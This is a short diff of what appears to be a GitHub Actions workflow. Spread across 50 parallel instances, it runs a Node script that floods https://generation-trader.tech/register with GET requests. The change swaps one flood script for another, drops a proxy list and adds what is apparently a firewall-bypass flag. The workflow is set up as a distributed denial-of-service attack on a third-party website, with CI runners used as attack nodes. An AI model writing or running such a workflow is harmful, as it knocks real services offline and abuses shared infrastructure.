@@ -46,7 +46,7 @@ jobs:
           unzip Fc-main.zip
           cd Fc-main
          
-          node kl.js GET https://generation-trader.tech/register 200 4 120 proxy.txt --full
+          node y.js GET https://generation-trader.tech/register 200 4 120  --full --debug --bfw
         env:
           INSTANCE_NUMBER: ${{ matrix.instance }}
           TOTAL_INSTANCES: 50
